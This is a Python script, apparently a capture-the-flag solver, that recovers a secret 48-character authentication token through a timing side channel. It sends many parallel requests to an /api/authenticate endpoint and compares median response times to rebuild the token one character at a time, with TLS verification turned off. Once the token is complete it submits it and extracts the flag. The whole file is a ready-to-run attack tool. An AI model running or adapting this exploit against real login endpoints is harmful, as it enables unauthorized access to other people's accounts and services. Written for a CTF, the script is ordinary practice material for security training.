#!/usr/bin/env python3
"""
solve_fast.py - Ultra-Fast Timing Side-Channel Solver (v2.0)
============================================================
Optimizations:
1. ThreadPoolExecutor with Thread-Local Sessions (Keep-Alive TCP connection pool).
2. Dynamic Control Anchor ('!') to measure baseline network jitter at each step.
3. Adaptive Multi-Sample Median: Filters out latency spikes while preserving speed.
4. Auto-Sync metadata.json: Automatically tracks changing Whale container subdomains.
5. Atomic Checkpointing: Saves progress reliably without data corruption.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import statistics
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_DIR = Path(__file__).resolve().parent
META_FILE = BASE_DIR / "metadata.json"
CHECKPOINT_FILE = BASE_DIR / "checkpoint_token.txt"
FLAG_FILE = BASE_DIR / "flag.txt"

TOKEN_LEN = 48
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
FLAG_REGEX = re.compile(r"flag\{[^}]+\}", re.IGNORECASE)
RETRYABLE_STATUS = {502, 503, 504}


class FastTimingOracle:
    """A thread-safe, keep-alive client that dynamically syncs URL and measures latency."""

    def __init__(self, target_url: str | None = None) -> None:
        self.target_url = target_url.rstrip("/") if target_url else ""
        self._local = threading.local()

    def session(self) -> requests.Session:
        if hasattr(self._local, "session"):
            return self._local.session
        s = requests.Session()
        s.verify = False
        s.headers.update(
            {
                "User-Agent": "FastTimingSolver/2.0",
                "Accept": "application/json",
                "Content-Type": "application/json",
            }
        )
        self._local.session = s
        return s

    def sync_target(self) -> str:
        try:
            if META_FILE.exists():
                meta = json.loads(META_FILE.read_text(encoding="utf-8"))
                candidate = (meta.get("connection_info") or meta.get("instance_url") or "").rstrip("/")
                if candidate.startswith("http") and candidate != self.target_url:
                    self.target_url = candidate
                    print(f"\n🔄 [Auto-Sync] Container URL mới: {self.target_url}")
        except Exception:
            pass
        if not self.target_url:
            self.target_url = "https://4be0a56c-b5b0-46dd-9e9f-892af2738dca.222.255.138.122.nip.io"
        return self.target_url

    def request(self, token: str, timeout: float = 8.0) -> tuple[int, float, str] | None:
        url = self.sync_target()
        try:
            t0 = time.perf_counter()
            r = self.session().post(f"{url}/api/authenticate", json={"token": token}, timeout=timeout)
            elapsed = time.perf_counter() - t0
            if r.status_code in (200, 401):
                return r.status_code, elapsed, r.text
            if r.status_code in RETRYABLE_STATUS or (r.status_code == 404 and "frp" in r.text.lower()):
                self.sync_target()
        except requests.RequestException:
            pass
        return None

    def wait_until_ready(self) -> None:
        print("[*] Đang kiểm tra kết nối tới container…")
        while True:
            sample = self.request("!" * TOKEN_LEN, timeout=5.0)
            if sample is not None:
                print(f"[*] Container sẵn sàng (HTTP {sample[0]})!")
                return
            print("[*] Đang chờ container trực tuyến (thử lại sau 3s)...")
            time.sleep(3.0)

    def measure_token(self, token: str, rounds: int = 3) -> float:
        times: list[float] = []
        for _ in range(rounds):
            sample = self.request(token)
            if sample is not None:
                times.append(sample[1])
            else:
                time.sleep(0.5)
        return statistics.median(times) if times else 0.0

    def measure_batch(self, tokens: list[str], rounds: int, workers: int) -> dict[str, list[float]]:
        results: dict[str, list[float]] = {t: [] for t in tokens}

        def _worker_sample(t: str) -> tuple[str, float]:
            return t, self.measure_token(t, rounds=1)

        with ThreadPoolExecutor(max_workers=workers) as pool:
            for _ in range(rounds):
                futures = [pool.submit(_worker_sample, t) for t in tokens]
                for fut in as_completed(futures):
                    tok, elapsed = fut.result()
                    if elapsed > 0.0:
                        results[tok].append(elapsed)
        return results


def read_checkpoint() -> str:
    if not CHECKPOINT_FILE.exists():
        return ""
    try:
        token = CHECKPOINT_FILE.read_text(encoding="utf-8").strip()
        if len(token) <= TOKEN_LEN and all(c in CHARSET for c in token):
            return token
    except Exception:
        pass
    return ""


def save_checkpoint(token: str) -> None:
    tmp = CHECKPOINT_FILE.with_suffix(".tmp")
    tmp.write_text(token, encoding="utf-8")
    os.replace(tmp, CHECKPOINT_FILE)


def find_character_fast(oracle: FastTimingOracle, known: str, pos: int, rounds: int, workers: int) -> str:
    t_start = time.perf_counter()
    padding = "a" * (TOKEN_LEN - pos - 1)
    control_token = known + "!" + padding
    guesses = {c: known + c + padding for c in CHARSET}

    # Measure control baseline
    ctrl_time = oracle.measure_token(control_token, rounds=max(3, rounds))
    baseline = ctrl_time if ctrl_time > 0.0 else 0.035

    # Parallel sweep across all candidate characters
    batch_data = oracle.measure_batch(list(guesses.values()), rounds=rounds, workers=workers)
    
    char_medians: list[tuple[str, float]] = []
    for c, full_token in guesses.items():
        samples = batch_data.get(full_token, [])
        med = statistics.median(samples) if samples else 0.0
        char_medians.append((c, med))

    char_medians.sort(key=lambda x: x[1], reverse=True)
    best_char, best_time = char_medians[0]
    _second_char, second_time = char_medians[1]
    margin = (best_time - second_time) * 1000
    lift = (best_time - baseline) * 1000

    elapsed = time.perf_counter() - t_start
    print(
        f"  [{pos + 1:02d}/{TOKEN_LEN}] 🎯 '{best_char}' ({best_time:.4f}s) | "
        f"Lift: +{lift:.1f}ms | Margin: {margin:.1f}ms | ⏱️ {elapsed:.1f}s"
    )
    return best_char


def authenticate_and_get_flag(oracle: FastTimingOracle, token: str) -> str | None:
    print(f"\n[*] Đang gửi chuỗi token ({len(token)} chars) để lấy Flag...")
    sample = oracle.request(token, timeout=15.0)
    if sample:
        status, _, body = sample
        print(f"[*] Response: HTTP {status}\n{body}")
        match = FLAG_REGEX.search(body)
        if match:
            return match.group(0)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Fast Timing Side-Channel Solver")
    parser.add_argument("url", nargs="?", help="URL instance (tuỳ chọn)")
    parser.add_argument("--workers", type=int, default=6, help="Số luồng song song (mặc định: 6)")
    parser.add_argument("--rounds", type=int, default=4, help="Số mẫu đo / ký tự (mặc định: 4)")
    parser.add_argument("--force-rescan", action="store_true", help="Xoá checkpoint và quét lại từ đầu")
    args = parser.parse_args()

    oracle = FastTimingOracle(args.url)
    oracle.sync_target()

    print("=" * 80)
    print("⚡ FAST TIMING SIDE-CHANNEL SOLVER (v2.0)")
    print(f"🎯 Target       : {oracle.target_url}")
    print(f"⚡ Workers      : {args.workers} concurrent sessions")
    print(f"📊 Rounds       : {args.rounds} samples / candidate")
    print("=" * 80)

    if args.force_rescan:
        if CHECKPOINT_FILE.exists():
            CHECKPOINT_FILE.unlink()
        known = ""
    else:
        known = read_checkpoint()

    print(f"[*] Checkpoint hiện tại: '{known}' ({len(known)}/{TOKEN_LEN})")
    oracle.wait_until_ready()

    # Pre-check if already solved
    if len(known) == TOKEN_LEN and not args.force_rescan:
        flag = authenticate_and_get_flag(oracle, known)
        if flag:
            print(f"\n🏆 FLAG THÀNH CÔNG: {flag}")
            FLAG_FILE.write_text(flag + "\n", encoding="utf-8")
            return 0

    t_all = time.perf_counter()
    for pos in range(len(known), TOKEN_LEN):
        char = find_character_fast(oracle, known, pos, rounds=args.rounds, workers=args.workers)
        known += char
        save_checkpoint(known)
        
        pct = (len(known) / TOKEN_LEN) * 100
        avg_per_char = (time.perf_counter() - t_all) / max(1, len(known) - len(read_checkpoint()) + 1)
        eta = avg_per_char * (TOKEN_LEN - len(known))
        print(f"      --> Token: {known} [{pct:.1f}%] (ETA: ~{eta:.0f}s)")

    flag = authenticate_and_get_flag(oracle, known)
    if flag:
        print(f"\n🏆🏆🏆 FLAG THÀNH CÔNG: {flag} 🏆🏆🏆")
        FLAG_FILE.write_text(flag + "\n", encoding="utf-8")
        return 0
    else:
        print("[!] Đã gửi toàn bộ token nhưng chưa bắt được flag hợp lệ.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
